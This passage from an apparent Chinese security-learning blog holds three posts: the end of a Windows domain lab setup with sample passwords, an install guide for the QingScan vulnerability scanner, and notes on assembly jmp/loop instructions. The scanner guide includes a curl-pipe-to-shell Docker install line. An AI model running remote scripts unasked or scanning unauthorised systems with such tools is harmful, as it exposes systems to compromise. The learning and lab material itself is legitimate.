<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125639375747.png" alt="img" /></p>
<h5 id="安装dns服务"><a class="anchor" href="#安装dns服务">#</a> 安装 DNS 服务</h5>
<p>点击 &quot;添加用户和功能&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125163407601.png" alt="image-20211125163407601" /></p>
<p>一直默认点击下一步<br />
选择安装 &quot;DNS 服务器&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125163511062.png" alt="image-20211125163511062" /></p>
<p>继续默认下一步<br />
最后确认安装。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125163606440.png" alt="image-20211125163606440" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125163636343.png" alt="image-20211125163636343" /></p>
<p>安装成功后，仪表盘会显示 DNS</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125163636344.png" alt="img" /></p>
<h5 id="安装active-directory域服务"><a class="anchor" href="#安装active-directory域服务">#</a> 安装 Active Directory 域服务</h5>
<p>与安装 DNS 相似，添加 Active Directory 域服务</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125163850677.png" alt="image-20211125163850677" /></p>
<p>一路默认安装即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125163937573.png" alt="image-20211125163937573" /></p>
<p>安装成功后，仪表盘可看到 AD DS</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-2021112563937574.png" alt="img" /></p>
<h4 id="升级域环境"><a class="anchor" href="#升级域环境">#</a> 升级域环境</h4>
<p>选择 AD DS 服务，点击更多，单击 &quot;将此服务器升为域控制器&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125639375745.png" alt="img" /></p>
<p>进入 &quot;Active Directory 域服务配置向导&quot; 界面<br />
选择 &quot;添加新林&quot;，输入根域名 &quot;<span class="exturl" data-url="aHR0cDovLzIxcjAwMC5vcmc=">21r000.org</span>&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125164518359.png" alt="image-20211125164518359" /></p>
<p>&quot;林功能级别&quot;、&quot;域功能级别&quot; 都设置为 &quot;Windows Server 2012 R2&quot;<br />
设置域还原密码&quot;21r000@666&quot;，当域控出现问题，可以用该密码还原数据。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125164640087.png" alt="image-20211125164640087" /></p>
<p>在 &quot;DNS 选项&quot;，出现 DNS 警告，保持默认即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125164703100.png" alt="image-20211125164703100" /></p>
<p>保持默认即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125164808364.png" alt="image-20211125164808364" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125164922303.png" alt="image-20211125164922303" /></p>
<p>建议使用网络用户命令行工具的 /passwordreq:yes 选项获得该账户密码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125165015500.png" alt="image-20211125165015500" /></p>
<p>以管理员身份运行 cmd，运行一下命令</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Start-Process powershell -Verb runAs <span class="token comment">#进入管理员模式</span></pre></td></tr><tr><td data-num="2"></td><td><pre>net user administrator 21r000@2012  <span class="token comment">#设置密码</span></pre></td></tr><tr><td data-num="3"></td><td><pre>net user administrator /passwordreq:yes</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125165542115.png" alt="image-20211125165542115" /></p>
<p>即可通过检查</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125165656220.png" alt="image-20211125165656220" /></p>
<p>安装后系统会自动重启。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125170739224.png" alt="image-20211125170739224" /></p>
<p>出现域信息，成功安装。</p>
<h5 id="创建active-directory用户"><a class="anchor" href="#创建active-directory用户">#</a> 创建 Active Directory 用户</h5>
<p>选择工具 ---Active Directory 用户和计算机</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125170859662.png" alt="image-20211125170859662" /></p>
<p>选择 users，右键单击</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125171132481.png" alt="image-20211125171132481" /></p>
<p>新建用户</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125171300132.png" alt="image-20211125171300132" /></p>
<p>设置密码 <code>21r000@666</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125171400687.png" alt="image-20211125171400687" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125171442655.png" alt="image-20211125171442655" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125171504171.png" alt="image-20211125171504171" /></p>
<h4 id="win7域环境搭建"><a class="anchor" href="#win7域环境搭建">#</a> WIN7 域环境搭建</h4>
<h5 id="加入域"><a class="anchor" href="#加入域">#</a> 加入域</h5>
<p>将该计算机 IP 地址设置为 <code>10.211.55.7</code></p>
<p>子网掩码设置为 <code>255.0.0.0</code></p>
<p>设置 DNS 为 <code>10.211.55.12</code>  和 <code>202.102.154.3</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125172534652.png" alt="image-20211125172534652" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125172510243.png" alt="image-20211125172510243" /></p>
<p>如果 ping 无法请求，查看是否关闭防火墙；<br />
 如果返回 IPv6 的地址，关闭 IPv6 即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125639375748.png" alt="img" /></p>
<p>然后修改计算机名为 &quot;Win7-computer&quot;。重启。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125172843354.png" alt="image-20211125173149699" /></p>
<p><span class="exturl" data-url="aHR0cDovL3huLS0yMXIwMDAtaHcyam84MmI3OWEub3Jn">填写域 21r000.org</span>，点击确定。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125173401381.png" alt="image-20211125173401381" /></p>
<p>输入域控主机 server 2012 的用户名和密码。可成功加入 21r000.org 域</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125173623529.png" alt="image-20211125173926007" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125173950959.png" alt="image-20211125173950959" /></p>
<p>重启计算机后，可使用 21r000O/21r000@666 登录域。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125174639227.png" alt="image-20211125174639227" /></p>
<h4 id="winserver2008"><a class="anchor" href="#winserver2008">#</a> winserver2008</h4>
<p>大致上和 win7 的操作一致</p>
<p>重命名 server 2008 计算机名为 Winserver2008<br />
 更改 administrator 账户密码</p>
<figure class="highlight css"><figcaption data-lang="CSS"></figcaption><table><tr><td data-num="1"></td><td><pre>net user administrator 21r000@2008</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125211613626.png" alt="image-20211125211613626" /></p>
<p>将该计算机 IP 地址设置为 <code>10.211.55.8</code></p>
<p>子网掩码设置为 <code>255.0.0.0</code></p>
<p>设置 DNS 为 <code>10.211.55.12</code>  和 <code>202.102.154.3</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125211756176.png" alt="image-20211125211756176" /></p>
<p>配置好后，和之前一样 ping 一下，检测是否成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125212112180.png" alt="image-20211125212112180" /></p>
<p>然后修改计算机名为 &quot;Win2008-computer&quot;，重启。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125212417742.png" alt="image-20211125212417742" /></p>
<p>server 2012 域控新建给的用户和密码为：21r000OO/21r000@666</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125180540565.png" alt="image-20211125180540565" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125212650622.png" alt="image-20211125212650622" /></p>
<p>成功得到欢迎弹窗，重启。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125212734573.png" alt="image-20211125212734573" /></p>
<p>再次检测</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211125212858499.png" alt="image-20211125212858499" /></p>
<p>配置欧克！</p>
<h3 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h3>
<p>接触域的第一天 yeyeye，简单了解了一下工作组和域概念，重点还是在域环境的搭建吧 23333。</p>
<p>虽然有点小失误，但问题不大，及时改正即可了。</p>
<p>总的来说只有域控的配置有一点点麻烦，域用户的配置倒是没什么，照本宣科就好啦。</p>
<p>参考资料：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvMkpkTVJnQTlUbENWNWh3TzZpaFZXUQ==">内网学习笔记</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvNXdnQ0dIckU1TU5zS3ZOOXJDaEJzdw=="> 内网渗透 | 工作组和域的区别</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYmktalNtUlJ2bzc3N1dqTnJVTTdPUQ==">工作组环境中进行内网渗透常见方法总结</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kMWRmODU2MDIxMGM=">域环境的搭建</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>批量漏洞挖掘工具QS的安装与使用教程</title>
    <url>/article/159145e.html</url>
    <content><![CDATA[<h2 id="介绍"><a class="anchor" href="#介绍">#</a> <strong>介绍</strong></h2>
<p>QingScan 是一款聚合扫描器，本身不生产安全扫描功能，但会作为一个安全扫描工具的搬运工；当添加一个目标后，QingScan 会自动调用各种扫描器对目标进行扫描，并将扫描结果录入到 QingScan 平台中进行聚合展示</p>
<p>· GitHub：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzc4Nzc4NDQzL1FpbmdTY2Fu">https://github.com/78778443/QingScan</span></p>
<p>・码云地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vc29uZ2JveS9RaW5nU2Nhbg==">https://gitee.com/songboy/QingScan</span></p>
<p>・详细文档：<span class="exturl" data-url="aHR0cDovL3dpa2kucWluZ3NjYW4uc29uZ2JveS5zaXRl">http://wiki.qingscan.songboy.site</span></p>
<p>・哔哩哔哩：<span class="exturl" data-url="aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vNDM3MjczMDY1">https://space.bilibili.com/437273065</span></p>
<p>・官网地址：<span class="exturl" data-url="aHR0cDovL3FpbmdzY2FuLnNvbmdib3kuc2l0ZS8=">http://qingscan.songboy.site/</span></p>
<p>关于 QingScan 功能大体分为四个方向，信息收集，黑盒扫描，白盒审计，POC 利用，共计集成了 28 款插件，除了下图的内容，还有 nmap、fofa 等等未展示在思维导图内。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109182358718.png" alt="image-20220109182358718" /></p>
<h2 id="在线演示"><a class="anchor" href="#在线演示">#</a> <strong>在线演示</strong></h2>
<p><span class="exturl" data-url="aHR0cDovL3R4eThnLnNvbmdib3kuc2l0ZTo4MTEyLw==">在线体验直达</span></p>
<p>用户名：admin</p>
<p>密码：admin</p>
<p>注：在线体验地址为功能演示，不会对目标实际扫描～</p>
<h2 id="安装教程"><a class="anchor" href="#安装教程">#</a> <strong>安装教程</strong></h2>
<h4 id="1-dockers官方下载地址"><a class="anchor" href="#1-dockers官方下载地址">#</a> 1、 dockers 官方下载地址：</h4>
<p><span class="exturl" data-url="aHR0cDovL2dldC5kYW9jbG91ZC5pby8=">官网教程</span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>curl <span class="token operator">-</span>sSL https<span class="token punctuation">:</span><span class="token operator">//</span>get<span class="token punctuation">.</span>daocloud<span class="token punctuation">.</span>io<span class="token operator">/</span>docker <span class="token operator">|</span> sh</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109182818670.png" alt="image-20220109182818670" /></p>
<h4 id="2-安装composer管理工具"><a class="anchor" href="#2-安装composer管理工具">#</a> 2、 安装 composer 管理工具</h4>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>curl <span class="token operator">-</span>L https<span class="token punctuation">:</span><span class="token operator">//</span>get<span class="token punctuation">.</span>daocloud<span class="token punctuation">.</span>io<span class="token operator">/</span>docker<span class="token operator">/</span>compose<span class="token operator">/</span>releases<span class="token operator">/</span>download<span class="token operator">/</span><span class="token number">1.25</span><span class="token number">.1</span><span class="token operator">/</span>docker<span class="token operator">-</span>compose<span class="token operator">-</span>`uname <span class="token operator">-</span>s`<span class="token operator">-</span>`uname <span class="token operator">-</span>m` <span class="token operator">-</span>o <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>docker<span class="token operator">-</span>compose</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109183207237.png" alt="image-20220109183207237" /></p>
<p>添加可执行权限：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>chmod <span class="token operator">+</span>x <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>docker<span class="token operator">-</span>compose</pre></td></tr></table></figure><p>3、下载 QingScani 源码：<br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzc4Nzc4NDQzL1FpbmdTY2Fu">https://github.com/78778443/QingScan</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109183636741.png" alt="image-20220109183636741" /></p>
<p>4、拉取镜像并自动启动项目：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>cd QingScan<span class="token operator">/</span>docker<span class="token operator">/</span>latest <span class="token operator">&amp;</span><span class="token operator">&amp;</span> docker<span class="token operator">-</span>compose up <span class="token operator">-</span>d</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109183751740.png" alt="image-20220109183751740" /></p>
<p>首次启动需要更新容器内代码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>docker <span class="token keyword">exec</span> qingscan sh <span class="token operator">-</span>c <span class="token string">'cd /root/qingscan &amp;&amp; git fetch &amp;&amp; git reset --hard origin/main &amp;&amp; rm code/public/install/install.lock'</span></pre></td></tr></table></figure><p>依次执行命令创建 MySQL 数据库</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>docker <span class="token keyword">exec</span> <span class="token operator">-</span>it mysqlser bash</pre></td></tr></table></figure><p>进入数据库交互</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql <span class="token operator">-</span>uroot <span class="token operator">-</span>p123</pre></td></tr></table></figure><p>执行创建数据库</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>CREATE DATABASE IF NOT EXISTS QingScan<span class="token punctuation">;</span></pre></td></tr></table></figure><p>5. 浏览器访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwLw==">http://127.0.0.1:8000/</span> 自动进入安装界面</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109184201778.png" alt="image-20220109184201778" /></p>
<h2 id="使用教程"><a class="anchor" href="#使用教程">#</a> 使用教程</h2>
<p>默认账号：admin</p>
<p>密码：admin</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109184607569.png" alt="image-20220109184607569" /></p>
<p>填写配置信息，一般为默认。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109184626507.png" alt="image-20220109184626507" /></p>
<p>点击下一步，配置信息即可导入成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109184724126.png" alt="image-20220109184724126" /></p>
<p>返回主页登录即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109184815756.png" alt="image-20220109184815756" /></p>
<h4 id="1-控制单个插件开关"><a class="anchor" href="#1-控制单个插件开关">#</a> 1、控制单个插件开关</h4>
<p>在系统设置→守护进程列表，这里可以控制单个插件是否启动。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109184902525.png" alt="image-20220109184902525" /></p>
<h4 id="2-添加扫描任务"><a class="anchor" href="#2-添加扫描任务">#</a> 2、添加扫描任务</h4>
<p>在黑盒，添加目标信息即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109184931803.png" alt="image-20220109184931803" /></p>
<h4 id="3-查看扫描结果"><a class="anchor" href="#3-查看扫描结果">#</a> 3、查看扫描结果</h4>
<p>点击 “查看详情” 去查看漏洞详细信息，可以看到 app 信息、指纹识别、子域名等等…，</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220109185159490.png" alt="image-20220109185159490" /></p>
<p>1.fortify 涉及许可证问题，镜像内不包含，需要自己将 Linux 版本的 fortify 放到 /data/tools 文件夹中。</p>
<p>2.AWVS 调用主要通过 API，需要自己将 API 配置系统，配置管理中去。</p>
<p><strong>注：在安装之后请不要对未获得足够授权的目标进行扫描。</strong></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之JMP和LOOP学习</title>
    <url>/article/28bedc94.html</url>
    <content><![CDATA[<p>通过这篇文章带你了解汇编语言中的 <code>jmp</code>  和 <code>loop</code>  的使用，而事实上这两个东西就相当于 C 语言中的<strong>跳转</strong>和<strong>循环</strong></p>
<ul>
<li>
<p>jmp 就是无条件跳转</p>
</li>
<li>
<p>loop 就相当于 C 语言中的循环</p>
</li>
</ul>
<p>通过对它们的学习，就能解决我们分支和循环的问题。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/9c4db145dde5ebc5e29a173bdcb9d46.png" alt="image-9c4db145dde5ebc5e29a173bdcb9d46" /></p>
<h2 id="jmp学习"><a class="anchor" href="#jmp学习">#</a> JMP 学习</h2>
<p>先用一个简单的样例进行测试，观察 <code>jmp</code>  的作用</p>
<h3 id="无jmp作用的代码"><a class="anchor" href="#无jmp作用的代码">#</a> 无 jmp 作用的代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	inc eax<span class="token punctuation">;</span>inc相当于C语言中的 <span class="token operator">++</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="23"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="24"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="25"></td><td><pre>END main</pre></td></tr></table></figure><p>在经 <code>inc</code>  递增之后可以看到 eax = 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124203209945.png" alt="image-20220124203209945" /></p>
<h3 id="有jmp作用的代码"><a class="anchor" href="#有jmp作用的代码">#</a> 有 jmp 作用的代码</h3>
<p>添加 jmp 作用之后，再观察 jmp 的作用效果</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	inc eax<span class="token punctuation">;</span>inc相当于C语言中的 <span class="token operator">++</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	jmp lp</pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><p>可以看到此时在 inc eax 处是已完成清零操作的</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124203652098.png" alt="image-20220124203652098" /></p>
<p>再在 jmp 处进行调试可以发现此时 eax = 1 了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124203834706.png" alt="image-20220124203834706" /></p>
<p>此时再在 <code>jmp</code>  处进行调试可以发现自动跳转到 <code>lp</code>  那对 <code>inc eax</code>  进行执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124204028019.png" alt="image-20220124204028019" /></p>
<p>再进行一次测试可以发现 eax = 2 了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124204218892.png" alt="image-20220124204218892" /></p>
<p>不难发现 jmp 对其后的标号进行跳转，且无条件跳转</p>
<h2 id="loop学习"><a class="anchor" href="#loop学习">#</a> LOOP 学习</h2>
<p>相比于上面 <code>jmp</code>  的死循环， <code>loop</code>  的循环次数更为可控</p>
<p><strong>测试代码</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token number">10</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	inc eax<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p>给 <code>ecx</code>  赋值为 <code>10</code> ，可以看到在第一次测试的时候可以看到 <code>ecx = A</code> ，即 <code>ecx = 10</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124204941844.png" alt="image-20220124204941844" /></p>
<p>对 <code>eac</code>  进行测试可以看到 <code>eax</code>  经过一次执行后变成了  <code>1</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205017287.png" alt="image-20220124205017287" /></p>
<p>执行一次 <code>loop，</code> 可以看到 <code>ecx = 9</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205133133.png" alt="image-20220124205133133" /></p>
<p>再次调试可以发现 <code>eax = 2</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205208818.png" alt="image-20220124205208818" /></p>
<p>而 <code>ecx</code>  变成了 <code>8</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124205243935.png" alt="image-20220124205243935" /></p>
<p>通过上面的测试可以发现：每执行一次循环 <code>ecx - 1</code></p>
<p>这里 <code>loop</code>  指令的作用便是一直重复执行 <code>inc eax</code></p>
